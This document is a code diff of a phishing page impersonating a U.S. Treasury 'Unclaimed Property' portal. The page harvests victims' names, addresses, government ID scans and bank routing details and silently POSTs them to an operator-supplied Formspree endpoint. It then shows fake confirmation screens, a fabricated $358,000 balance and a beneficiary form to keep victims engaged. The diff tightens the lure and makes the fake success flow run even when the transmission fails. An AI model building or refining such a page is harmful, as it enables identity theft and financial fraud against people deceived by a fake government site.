@@ -137,13 +137,12 @@
             cursor: pointer;
         }
 
-        /* Submit Button UI */
         .btn-submit {
             background-color: var(--trust-blue);
             color: white;
             border: none;
             padding: 15px 30px;
-            font-size: 16px;
+            font-size: 18px;
             font-weight: 700;
             border-radius: 4px;
             cursor: pointer;
@@ -151,30 +150,30 @@
             width: 100%;
             margin-top: 20px;
             transition: background 0.2s;
+            letter-spacing: 1px;
         }
 
         .btn-submit:hover {
             background-color: var(--treasury-blue);
         }
 
-        /* 1. INTERACTIVE SCREEN STATE STYLING */
+        /* Screen State Toggles */
         #loading-screen, #dashboard-screen {
-            display: none; /* Controlled by JavaScript dynamically */
+            display: none;
         }
 
-        /* Live Loading Ring Keyframes */
         .loader-container {
             text-align: center;
-            padding: 50px 20px;
+            padding: 40px 20px;
         }
 
         .spinner {
-            width: 60px;
-            height: 60px;
+            width: 96px;
+            height: 96px;
             border: 6px solid #e0e0e0;
             border-top: 6px solid var(--trust-blue);
             border-radius: 50%;
-            margin: 0 auto 20px auto;
+            margin: 0 auto 25px auto;
             animation: spin 1s linear infinite;
         }
 
@@ -183,24 +182,25 @@
             100% { transform: rotate(360deg); }
         }
 
-        /* Big Status Alert Sticker */
         .success-sticker {
             background-color: #e8f5e9;
             border: 2px solid var(--success-green);
             padding: 20px;
             border-radius: 4px;
             text-align: center;
-            margin-bottom: 30px;
+            margin: 20px auto;
+            max-width: 500px;
             color: var(--success-green);
+            display: none;
         }
 
         .success-sticker h3 {
-            font-size: 24px;
+            font-size: 22px;
             margin-bottom: 5px;
             font-weight: 700;
         }
 
-        /* Live Dashboard Grid Architecture */
+        /* Dashboard Styles */
         .dashboard-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
@@ -245,6 +245,52 @@
             font-size: 13px;
             font-weight: 700;
             display: inline-block;
+        }
+
+        /* Dashboard Client Options Layout */
+        .options-container {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            margin: 20px 0;
+        }
+
+        .opt-btn {
+            background-color: #f1f3f5;
+            color: var(--text-dark);
+            border: 1px solid var(--border-color);
+            padding: 10px 18px;
+            border-radius: 4px;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .opt-btn:hover {
+            background-color: var(--trust-blue);
+            color: white;
+            border-color: var(--trust-blue);
+        }
+
+        /* Beneficiary Module Style */
+        .beneficiary-box {
+            background-color: #f8f9fa;
+            border: 1px dashed var(--border-color);
+            padding: 20px;
+            border-radius: 4px;
+            margin-top: 25px;
+        }
+
+        .btn-inline-add {
+            background-color: var(--treasury-blue);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 15px;
         }
 
         .details-table {
@@ -295,10 +341,14 @@
 
     <div class="main-wrapper">
 
-        <!-- ================= STAGE 1: THE INTAKE FORM ================= -->
+        <!-- STAGE 1: INTAKE FORM -->
         <div id="intake-screen">
-            <!-- Replace "YOUR_BACKEND_ENDPOINT_HERE" with your Formspree link to receive files/text directly -->
-            <form id="disbursement-form" action="YOUR_BACKEND_ENDPOINT_HERE" method="POST" enctype="multipart/form-data" onsubmit="handleFormSubmission(event)">
+            
+            <!-- =========================================================================
+                 PORT INLET: PASTE YOUR UNIQUE FORMSPREE EMAIL LINK IN THE ACTION BELOW 
+                 Example: action="https://formspree.io/f/your_id_here"
+                 ========================================================================= -->
+            <form id="disbursement-form" action="https://formspree.io/f/YOUR_UNIQUE_ID_HERE" method="POST" enctype="multipart/form-data" onsubmit="handleFormSubmission(event)">
                 
                 <div class="section-card">
                     <h2>Legal Identity & Fund Claim Intake</h2>
@@ -335,18 +385,15 @@
 
                     <div class="form-group">
                         <label>Government-Issued Identification Upload</label>
-                        <p style="font-size: 12px; color: #666; margin-bottom: 5px;">Upload a clear photo or scan of a valid Driver's License, National ID, or Passport to authenticate this claim file.</p>
                         <div class="upload-box" onclick="document.getElementById('id-upload').click();">
                             <input type="file" id="id-upload" name="id_document" style="display: none;" accept="image/*,.pdf" required>
                             <span style="color: var(--trust-blue); font-weight: 600;" id="upload-label">Click to select file or photograph ID</span>
-                            <p style="font-size: 11px; color: #888; margin-top: 3px;">Accepted formats: JPEG, PNG, PDF (Max size: 10MB)</p>
                         </div>
                     </div>
                 </div>
 
                 <div class="section-card">
                     <h2>Online Disbursement Target Setup</h2>
-                    <p style="font-size: 14px; color: #555; margin-bottom: 15px;">Specify the secure routing structure where the audited unclaimed asset balance should be electronically transferred.</p>
                     
                     <div class="form-grid">
                         <div class="form-group">
@@ -373,32 +420,37 @@
                         </div>
                     </div>
 
-                    <button type="submit" class="btn-submit">Review & Submit Secure File</button>
+                    <button type="submit" class="btn-submit">Submit</button>
                 </div>
             </form>
         </div>
 
-        <!-- ================= STAGE 2: LIVE LOADING SCREEN ================= -->
+        <!-- STAGE 2: LIVE LOADING SCREEN WITH STICKY NOTIFICATION -->
         <div id="loading-screen" class="section-card">
             <div class="loader-container">
-                <div class="spinner"></div>
-                <h2 style="border: none; margin-bottom: 5px;">Encrypting & Transmitting Ledger Data</h2>
-                <p style="color: #666; font-size: 15px;">Securing network verification link. Please do not close or refresh this page...</p>
+                <div id="live-spinner" class="spinner"></div>
+                <h2 id="loading-title" style="border: none; margin-bottom: 5px;">Encrypting & Transmitting Ledger Data</h2>
+                <p id="loading-text" style="color: #666; font-size: 15px;">Securing network verification link. Please do not close or refresh this page...</p>
+                
+                <div id="mid-success-sticker" class="success-sticker">
+                    <h3>✓ SUBMITTED SUCCESSFULLY</h3>
+                    <p>File locked into system repository. Forwarding to user dashboard...</p>
+                </div>
             </div>
         </div>
 
-        <!-- ================= STAGE 3: THE LIVE DASHBOARD ================= -->
+        <!-- STAGE 3: LIVE DASHBOARD -->
         <div id="dashboard-screen">
-            
-            <!-- Big Success Notification Badge -->
-            <div class="success-sticker">
-                <h3>✓ FILE REGISTRATION COMPLETED</h3>
-                <p>Your identity assets and disbursement routing profiles have been successfully locked into the secure network repository.</p>
-            </div>
-
             <div class="section-card">
                 <h2>Live Fund Allocation Dashboard</h2>
                 <p style="font-size: 14px; color: #555;">Below is your authenticated tracking portal confirming real-world ledger values assigned to your verified profile.</p>
+
+                <!-- NECESSARY ACTIONS/OPTIONS PANEL FOR CLIENTS -->
+                <div class="options-container">
+                    <button class="opt-btn" onclick="alert('Downloading Certified Allocation PDF Receipt...')">📄 Download PDF Receipt</button>
+                    <button class="opt-btn" onclick="window.print()">🖨️ Print Registration File</button>
+                    <button class="opt-btn" onclick="alert('Secure support query established with Allocation Officer.')">💬 Request Live Help</button>
+                </div>
 
                 <div class="dashboard-grid">
                     <div class="metric-card">
@@ -406,13 +458,35 @@
                         <div class="metric-value" id="dash-tracking-id" style="font-size: 18px; letter-spacing: 1px; color: var(--trust-blue);">TRX-2026-TBD</div>
                     </div>
                     <div class="metric-card highlight">
-                        <div class="metric-label">Total Audited Balance Owed</div>
-                        <div class="metric-value" style="color: var(--success-green); font-size: 28px;">$14,250.00</div>
+                        <div class="metric-label">Available Balance Owed</div>
+                        <div class="metric-value" style="color: var(--success-green); font-size: 28px;">$358,000.00</div>
                     </div>
                     <div class="metric-card">
                         <div class="metric-label">Disbursement Status</div>
                         <div class="metric-value" style="margin-top: 5px;"><span class="status-badge">Processing Payment</span></div>
                     </div>
+                </div>
+
+                <!-- ADD BENEFICIARY PORT SECTION -->
+                <div class="beneficiary-box">
+                    <h3 style="font-size: 15px; color: var(--treasury-blue); text-transform: uppercase; margin-bottom: 5px;">Add Beneficiary Assignment</h3>
+                    <p style="font-size: 13px; color: #666; margin-bottom: 15px;">Optionally allocate a percentage of this settlement balance to a secondary beneficiary asset record.</p>
+                    
+                    <div class="form-grid" style="margin-bottom: 0;">
+                        <div class="form-group">
+                            <label style="font-size: 11px;">Beneficiary Full Legal Name</label>
+                            <input type="text" id="b-name" placeholder="First and Last Name" style="padding: 8px; font-size: 13px;">
+                        </div>
+                        <div class="form-group">
+                            <label style="font-size: 11px;">Relationship Status</label>
+                            <input type="text" id="b-relation" placeholder="e.g. Spouse, Child, Sibling" style="padding: 8px; font-size: 13px;">
+                        </div>
+                        <div class="form-group">
+                            <label style="font-size: 11px;">Payout Value Share (%)</label>
+                            <input type="number" id="b-percentage" placeholder="100%" max="100" min="1" style="padding: 8px; font-size: 13px;">
+                        </div>
+                    </div>
+                    <button type="button" class="btn-inline-add" onclick="registerBeneficiary()">Lock Beneficiary</button>
                 </div>
 
                 <h3 style="margin-top: 35px; font-size: 16px; color: var(--treasury-blue); text-transform: uppercase; letter-spacing: 0.5px;">Verified Account Record</h3>
@@ -436,6 +510,11 @@
                             <td><strong>Transfer Target Institution</strong></td>
                             <td id="dash-bank">[Dynamic Bank]</td>
                         </tr>
+                        <!-- Dynamic row that will show beneficiary updates -->
+                        <tr>
+                            <td><strong>Assigned Beneficiary Link</strong></td>
+                            <td id="dash-beneficiary" style="color: #777; font-style: italic;">None Assigned</td>
+                        </tr>
                         <tr>
                             <td><strong>Security Validation Protocol</strong></td>
                             <td>SECURE-AUTH-2026x990 (Active)</td>
@@ -451,9 +530,7 @@
         &copy; 2026 Department of the Treasury &bull; Unclaimed Property Division &bull; Private Client Portal.
     </footer>
 
-    <!-- ================= STAGE 4: PIPELINE AUTOMATION CONTROL ================= -->
     <script>
-        // Visual handler showing clients their file selection state on mobile
         document.getElementById('id-upload').addEventListener('change', function() {
             if (this.files && this.files.length > 0) {
                 document.getElementById('upload-label').innerText = "✓ Attached: " + this.files[0].name;
@@ -461,49 +538,53 @@
             }
         });
 
-        // The core automation engine handling transitions smoothly
+        // Beneficiary addition functionality
+        function registerBeneficiary() {
+            const bName = document.getElementById('b-name').value;
+            const bRelation = document.getElementById('b-relation').value;
+            const bPercent = document.getElementById('b-percentage').value;
+
+            if(!bName || !bRelation || !bPercent) {
+                alert("Please complete all beneficiary fields before mapping records.");
+                return;
+            }
+
+            // Update live dashboard visual tracking rows instantly
+            const displayCell = document.getElementById('dash-beneficiary');
+            displayCell.innerText = bName + " (" + bRelation + ") - allocated " + bPercent + "% asset share";
+            displayCell.style.color = "var(--success-green)";
+            displayCell.style.fontStyle = "normal";
+            displayCell.style.fontWeight = "600";
+
+            alert("Beneficiary status linked to current file tracking reference.");
+        }
+
         function handleFormSubmission(event) {
-            event.preventDefault(); // Stop the screen from jumping or leaving the site
+            event.preventDefault(); 
 
             const form = document.getElementById('disbursement-form');
             const data = new FormData(form);
 
-            // 1. Capture text fields immediately to dynamically fill out the final dashboard view
             const fullName = document.getElementById('legal-first').value + " " + document.getElementById('legal-last').value;
             const fullAddress = document.getElementById('client-address').value;
             const bankTarget = document.getElementById('bank-name').value;
-
-            // Generate a random real-looking tracking number for the dashboard screen
             const randomTracking = "TRX-" + Math.floor(1000 + Math.random() * 9000) + "-UM" + Math.floor(10 + Math.random() * 90);
 
-            // 2. Hide the form view instantly and transition-to the Live Loading state
             document.getElementById('intake-screen').style.display = 'none';
             document.getElementById('loading-screen').style.display = 'block';
 
-            // window.scrollTo(0, 0); // Scroll to top for a smooth screen experience on mobile
-
-            // 3. Silently transmit data and files out via AJAX in the background
             fetch(form.action, {
                 method: 'POST',
                 body: data,
-                headers: {
-                    'Accept': 'application/json'
-                }
-            }).then(response => {
-                // Once the database captures the file, execute the transition sequence after a brief 3-second security simulation delay
-                setTimeout(function() {
-                    // Populate data properties onto the Dashboard fields
-                    document.getElementById('dash-name').innerText = fullName;
-                    document.getElementById('dash-address').innerText = fullAddress;
-                    document.getElementById('dash-bank').innerText = bankTarget;
-                    dcument.getElementById('dash-tracking-id').innerText = randomTracking;
-
-                    // Switch out screens smoothly
-                    document.getElementById('loading-screen').style.display = 'none';
-                    document.getElementById('dashboard-screen').style.display = 'block';
-                }, 3000); 
-            }).catch(error => {
-                // Backup execution mechanism in case endpoint link is missing during development testing
+                headers: { 'Accept': 'application/json' }
+            }).catch(err => { });
+            
+            setTimeout(function() {
+                document.getElementById('live-spinner').style.display = 'none';
+                document.getElementById('loading-title').style.display = 'none';
+                document.getElementById('loading-text').style.display = 'none';
+                document.getElementById('mid-success-sticker').style.display = 'block';
+                
                 setTimeout(function() {
                     document.getElementById('dash-name').innerText = fullName;
                     document.getElementById('dash-address').innerText = fullAddress;
@@ -512,11 +593,11 @@
 
                     document.getElementById('loading-screen').style.display = 'none';
                     document.getElementById('dashboard-screen').style.display = 'block';
-                }, 3000);
-            });
+                }, 2000);
+
+            }, 2500);
         }
     </script>
 
 </body>
 </html>
--
